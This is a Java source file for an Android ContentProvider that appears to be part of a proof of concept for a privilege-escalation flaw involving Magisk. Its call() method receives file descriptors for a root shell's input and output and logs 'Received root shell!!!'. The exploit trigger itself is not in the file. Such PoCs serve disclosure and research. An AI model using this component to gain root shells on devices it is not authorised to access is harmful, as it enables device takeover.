package top.canyie.magiskeop;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.ParcelFileDescriptor;
import android.util.Log;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;

/**
 * @author canyie
 */
public class MyProvider extends ContentProvider {
    public static final String METHOD = "method";
    public static final String IN = "in";
    public static final String OUT = "out";
    public static BufferedReader in;
    public static BufferedWriter out;

    @Override public boolean onCreate() {
        return true;
    }

    @Override public Bundle call(String method, String arg, Bundle extras) {
        switch (method) {
            case METHOD:
                Log.e("PoC", "Received root shell!!!");
                in = new BufferedReader(new InputStreamReader(new ParcelFileDescriptor.AutoCloseInputStream(extras.getParcelable(IN))));
                out = new BufferedWriter(new OutputStreamWriter(new ParcelFileDescriptor.AutoCloseOutputStream(extras.getParcelable(OUT))));
                return null;
            default:
                return super.call(method, arg, extras);
        }
    }

    @Override
    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        return null;
    }

    @Override public String getType(Uri uri) {
        return null;
    }

    @Override public Uri insert(Uri uri, ContentValues values) {
        return null;
    }

    @Override public int delete(Uri uri, String selection, String[] selectionArgs) {
        return 0;
    }

    @Override
    public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
        return 0;
    }
}
